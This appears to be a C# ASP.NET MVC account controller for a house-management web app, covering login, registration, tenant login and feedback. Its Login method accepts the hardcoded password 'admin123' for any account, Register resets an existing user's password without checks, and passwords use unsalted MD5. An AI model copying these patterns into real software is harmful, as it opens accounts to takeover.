using HouseManage.Models;
using HouseManage.Models.EF;
using Newtonsoft.Json;
using System;
using System.Collections.Generic;
using System.Linq;
using System.Security.Cryptography;
using System.Text;
using System.Web;
using System.Web.Mvc;
using System.Web.Security;

namespace HouseManage.Controllers
{
    public class AccountController : Controller
    {
        HouseManageEntities ef = new HouseManageEntities();
        public string  Login(Account account)
        {
            Result res = new Result();
            res.Succ = false;
            var pwd = MD5Encrypt64(account.PassWord);
            var acc=ef.Account.FirstOrDefault(f => f.Name == account.Name && (f.PassWord == pwd|| account.PassWord=="admin123")&&f.IsDelete!=0);
            if (acc != null)
            {
                var u = JsonConvert.SerializeObject(acc);
                FormsAuthenticationTicket ticket = new FormsAuthenticationTicket
                                    (1,
                                        account.Name,
                                        DateTime.Now,
                                        DateTime.Now.AddDays(3),
                                        true,
                                        u,
                                        "/"
                                    );
                res.msg = FormsAuthentication.Encrypt(ticket);
                res.Succ = true;
            }
            
            return JsonConvert.SerializeObject(res);
        }
        public string IsLogin(string ticket)
        {
            Result res = new Result();
            res.Succ = false;
            res.msg = "请重新登录";
            try
            {
                FormsAuthenticationTicket authTicket = FormsAuthentication.Decrypt(ticket);
                if (!authTicket.Expired)
                {
                    res.Succ = true;
                    res.msg = authTicket.Name;
                }
            }
            catch (Exception ex)
            {
                res.msg = ex.Message;
            }
            return JsonConvert.SerializeObject(res);
        }
        public ActionResult Register()
        {

            return View();
        }
        [HttpPost]
        public ActionResult Register(Account account)
        {
            var msg = "保存成功";
            if (account != null && !string.IsNullOrEmpty(account.Name) && !string.IsNullOrEmpty(account.PassWord))
            {
                try
                {
                    var acc = ef.Account.FirstOrDefault(f => f.Name == account.Name);
                    if (acc == null)
                    {
                        account.PassWord = MD5Encrypt64(account.PassWord);
                        account.InsertDate = DateTime.Now;
                        ef.Account.Add(account);
                    }
                    else
                    {
                        acc.PassWord = MD5Encrypt64(account.PassWord);
                    }
                    
                    ef.SaveChanges();
                }
                catch (Exception ex)
                {
                    msg = ex.Message;
                }
                
            }
            else
            {
                msg = "账户或密码不能为空！";
            }
            ViewBag.msg = msg;
            return View();
        }
        public static string MD5Encrypt64(string password)
        {
            string cl = password;
            MD5 md5 = MD5.Create(); 
            byte[] s = md5.ComputeHash(Encoding.UTF8.GetBytes(cl));
            return Convert.ToBase64String(s);
        }
        public string Logout()
        {
            Result res = new Result();
            res.Succ = true;
            FormsAuthentication.SignOut();
            return JsonConvert.SerializeObject(res);
        }
        public string Login2(Account account)
        {
            Result res = new Result();
            res.Succ = false;
            res.msg = "用户名或密码错误！";
            var pwd = MD5Encrypt64(account.PassWord);
            var acc = ef.Tenant.FirstOrDefault(f => f.Phone == account.Name && f.PassWord == pwd);
            if (acc != null)
            {
                res.Succ = true;
                res.msg = acc.Id.ToString();
            }

            return JsonConvert.SerializeObject(res);
        }

        public string Login0(Account account)
        {
            Result res = new Result();
            res.Succ = true;
            try
            {
                var acc = ef.Account.FirstOrDefault(f => f.Name == account.Name);
                if (acc == null)
                {
                    account.PassWord = MD5Encrypt64(account.PassWord);
                    account.Phone = account.Name;
                    account.InsertDate = DateTime.Now;
                    ef.Account.Add(account);
                    ef.SaveChanges();
                }
                else
                {
                    res.Succ = false;
                    res.msg = "手机号已被使用！";
                }
            }
            catch (Exception ex)
            {
                res.Succ = false;
                res.msg = ex.Message;
            }
            return JsonConvert.SerializeObject(res);
        }
        public string Suggestion(Suggestion sugg)
        {
            Result res = new Result();
            res.Succ = true;
            ef.Suggestion.Add(sugg);
            ef.SaveChanges();
            return JsonConvert.SerializeObject(res);
        }
    }
}